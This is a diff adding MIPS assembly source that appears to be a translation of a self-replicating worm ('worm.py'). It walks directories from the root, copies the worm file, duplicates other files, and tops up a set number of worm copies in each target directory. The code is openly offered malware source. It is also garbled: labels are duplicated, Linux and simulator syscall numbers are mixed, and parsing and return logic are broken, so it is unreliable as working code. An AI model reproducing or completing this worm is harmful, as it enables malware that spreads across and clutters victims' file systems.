@@ -1,0 +1,402 @@
+".data
+path: .asciiz "/"
+target_dir_list: .space 4
+iteration: .word 2
+script_name: .asciiz "worm.py"
+untitled_folder: .asciiz "untitled_folder.py"
+buffer: .space 512
+
+.text
+.globl main
+
+main:
+    # Set up stack pointer and initialize registers
+
+    # Call list_directories
+    la $a0, path
+    jal list_directories
+
+    # Call create_new_worm
+    jal create_new_worm
+
+    # Call copy_existing_files
+    jal copy_existing_files
+
+    # Call check_worm_instances
+    jal check_worm_instances
+
+    # Exit program
+    li $v0, 10
+    syscall
+
+list_directories:
+    # Function to list directories
+    # Parameters:
+    #   $a0 - path
+
+    # Open directory
+    li $v0, 13   # syscall code for "open"
+    move $a1, $a0
+    li $a2, 0    # flags
+    li $a3, 0    # mode
+    syscall
+
+    # Save directory file descriptor
+    move $s0, $v0
+
+    # Read directory entries
+    la $t0, buffer   # buffer for directory entry
+    li $v0, 89   # syscall code for "getdents64"
+    move $a0, $s0   # file descriptor
+    syscall
+
+.loop:
+    beqz $v0, .done   # check if end of directory
+
+    # Extract filename from directory entry
+    li $s1, 0   # entry index
+    add $t0, $v0   # advance buffer pointer
+    lbu $v0, 9($t0)   # filename length
+    addi $t0, $t0, 1   # move to filename
+    la $a1, buffer   # destination buffer
+    sb $zero, ($a1)   # null-terminate the string
+    add $t1, $zero, $a1   # copy destination buffer address to $t1
+
+    # Print the filename
+    jal print_string
+
+    # Recursive call for subdirectories
+    move $a0, $t1   # subdirectory path
+    jal list_directories
+
+    j .loop
+
+.done:
+    # Close directory
+    li $v0, 16   # syscall code for "close"
+    move $a0, $s0   # file descriptor
+    syscall
+
+    jr $ra
+
+create_new_worm:
+    # Function to create new worm
+    # No parameters
+
+    # Copy script_name to destination
+    la $a0, untitled_folder
+    la $a1, script_name
+    jal copy_file
+
+    jr $ra
+
+copy_existing_files:
+    # Function to copy existing files
+    # No parameters
+
+    # Loop through target directories
+    la $t0, target_dir_list
+.loop:
+    lw $t1, ($t0)   # Check if end of target_dir_list
+    beqz $t1, .done
+
+    # Copy existing files
+    move $a0, $t1   # directory path
+    lw $a1, iteration
+    jal copy_files_in_directory
+
+    # Advance to the next target directory
+    addi $t0, $t0, 4
+    j .loop
+
+.done:
+    jr $ra
+
+copy_files_in_directory:
+    # Function to copy existing files in a directory
+    # Parameters:
+    #   $a0 - directory path
+    #   $a1 - iteration count
+
+    # Open directory
+    li $v0, 13   # syscall code for "open"
+    move $a2, $a0
+    li $a3, 0    # flags
+    li $t1, 0    # mode
+    syscall
+
+    # Save directory file descriptor
+    move $t2, $v0
+
+    # Read directory entries
+    la $t0, buffer   # buffer for directory entry
+    li $v0, 89   # syscall code for "getdents64"
+    move $a0, $t2   # file descriptor
+    syscall
+
+.loop:
+    beqz $v0, .done   # check if end of directory
+
+    # Extract filename from directory entry
+    li $t3, 0   # entry index
+    add $t0, $v0   # advance buffer pointer
+    lbu $v0, 9($t0)   # filename length
+    addi $t0, $t0, 1   # move to filename
+    la $a2, buffer   # source buffer
+    sb $zero, ($a2)   # null-terminate the string
+    add $t4, $zero, $a2   # copy source buffer address to $t4
+
+    # Check if the file is not a directory
+    move $a0, $t4   # source filename
+    jal is_regular_file
+    bnez $v0, .next_entry
+
+    # Copy the file
+    move $a0, $t4   # source filename
+    move $a1, $a2   # iteration count
+    jal copy_file
+
+.next_entry:
+    j .loop
+
+.done:
+    # Close directory
+    li $v0, 16   # syscall code for "close"
+    move $a0, $t2   # file descriptor
+    syscall
+
+    jr $ra
+
+check_worm_instances:
+    # Function to check worm instances
+    # No parameters
+
+    # Loop through target directories
+    la $t0, target_dir_list
+.loop:
+    lw $t1, ($t0)   # Check if end of target_dir_list
+    beqz $t1, .done
+
+    # Check worm instances
+    move $a0, $t1   # directory path
+    lw $a1, iteration
+    jal count_worm_instances
+    move $t2, $v0   # instance count
+
+    # Compare instance count with iteration count
+    bge $t2, $a1, .next_directory
+
+    # Create missing worm instances
+    sub $a2, $a1, $t2   # calculate missing instances count
+    move $a0, $a2
+    move $a1, $t1
+    jal create_new_worm_instances
+
+.next_directory:
+    # Advance to the next target directory
+    addi $t0, $t0, 4
+    j .loop
+
+.done:
+    jr $ra
+
+count_worm_instances:
+    # Function to count worm instances in a directory
+    # Parameters:
+    #   $a0 - directory path
+    #   $a1 - iteration count
+    # Returns:
+    #   $v0 - instance count
+
+    # Initialize instance count to 0
+    li $v0, 0
+
+    # Open directory
+    li $v0, 13   # syscall code for "open"
+    move $a2, $a0
+    li $a3, 0    # flags
+    li $t1, 0    # mode
+    syscall
+
+    # Save directory file descriptor
+    move $t2, $v0
+
+    # Read directory entries
+    la $t0, buffer   # buffer for directory entry
+    li $v0, 89   # syscall code for "getdents64"
+    move $a0, $t2   # file descriptor
+    syscall
+
+.loop:
+    beqz $v0, .done   # check if end of directory
+
+    # Extract filename from directory entry
+    li $t3, 0   # entry index
+    add $t0, $v0   # advance buffer pointer
+    lbu $v0, 9($t0)   # filename length
+    addi $t0, $t0, 1   # move to filename
+    la $a2, buffer   # source buffer
+    sb $zero, ($a2)   # null-terminate the string
+    add $t4, $zero, $a2   # copy source buffer address to $t4
+
+    # Check if the file is a worm instance
+    move $a0, $t4   # source filename
+    jal is_worm_instance
+    beqz $v0, .next_entry
+
+    # Increment instance count
+    addi $v0, $v0, 1
+
+.next_entry:
+    j .loop
+
+.done:
+    # Close directory
+    li $v0, 16   # syscall code for "close"
+    move $a0, $t2   # file descriptor
+    syscall
+
+    jr $ra
+
+create_new_worm_instances:
+    # Function to create missing worm instances
+    # Parameters:
+    #   $a0 - missing instances count
+    #   $a1 - directory path
+
+    # Copy missing worm instances
+    move $t3, $a0   # save missing instances count
+.loop:
+    move $a0, $a1   # directory path
+    jal create_new_worm
+    addi $t3, $t3, -1   # decrement missing instances count
+    bnez $t3, .loop
+
+    jr $ra
+
+is_regular_file:
+    # Function to check if a file is a regular file
+    # Parameters:
+    #   $a0 - file path
+    # Returns:
+    #   $v0 - 0 if not a regular file, 1 if a regular file
+
+    # Open file
+    li $v0, 13   # syscall code for "open"
+    move $a1, $a0
+    li $a2, 0    # flags
+    li $a3, 0    # mode
+    syscall
+
+    # Check if the file is a regular file
+    li $v0, 8   # syscall code for "fstat"
+    move $a0, $v0   # file descriptor
+    la $a1, buffer   # stat structure
+    syscall
+
+    # Check file type
+    lw $v0, buffer   # load file mode
+    andi $v0, $v0, 0170000   # S_IFMT mask
+    bnez $v0, .not_regular_file
+
+    # Check if regular file
+    li $v0, 1   # regular file
+    j .done
+
+.not_regular_file:
+    # Not a regular file
+    li $v0, 0   # return 0
+
+.done:
+    jr $ra
+
+is_worm_instance:
+    # Function to check if a file is a worm instance
+    # Parameters:
+    #   $a0 - file path
+    # Returns:
+    #   $v0 - 1 if a worm instance, 0 otherwise
+
+    # Check file extension
+    li $a0, 0   # file extension offset
+    la $a1, buffer   # file path
+    li $a2, 0   # iteration count
+.loop:
+    lb $t0, ($a1)   # load character from memory
+    beqz $t0, .done   # check for null terminator
+    bne $t0, '.', .next_char
+    addi $a2, $a2, 1   # increment iteration count
+    j .loop
+
+.next_char:
+    addi $a1, $a1, 1   # move to the next character
+    j .loop
+
+.done:
+    # Check if the file is a worm instance
+    beq $a2, $a1, .not_worm_instance
+
+    # It's a worm instance
+    li $v0, 1   # return 1
+    j .done
+
+.not_worm_instance:
+    # Not a worm instance
+    li $v0, 0   # return 0
+
+.done:
+    jr $ra
+
+copy_file:
+    # Function to copy a file
+    # Parameters:
+    #   $a0 - source file path
+    #   $a1 - destination file path
+
+    # Open source file
+    li $v0, 13   # syscall code for "open"
+    move $a2, $a0
+    li $a3, 0    # flags
+    li $t1, 0    # mode
+    syscall
+
+    # Save source file descriptor
+    move $t2, $v0
+
+    # Open destination file
+    li $v0, 13   # syscall code for "open"
+    move $a2, $a1
+    li $a3, 0    # flags
+    li $t1, 0    # mode
+    syscall
+
+    # Save destination file descriptor
+    move $t3, $v0
+
+    # Copy file content#  
+    la $a2, buffer   # buffer for file content
+    li $v0, 14   # syscall code for "read"
+    move $a0, $t2   # source file descriptor
+    move $a1, $a2   # buffer address
+    li $a3, 512   # buffer size
+    syscall
+
+    # Write file content to the destination file
+    li $v0, 15   # syscall code for "write"
+    move $a0, $t3   # destination file descriptor
+    move $a1, $a2   # buffer address
+    li $a2, 512   # buffer size
+    syscall
+
+    # Close source file
+    li $v0, 16   # syscall code for "close"
+    move $a0, $t2   # source file descriptor
+    syscall
+
+    # Close destination file
+    li $v0, 16   # syscall code for "close"
+    move $a0, $t3   # destination file descriptor
+    syscall
+
+    jr $ra"
+    
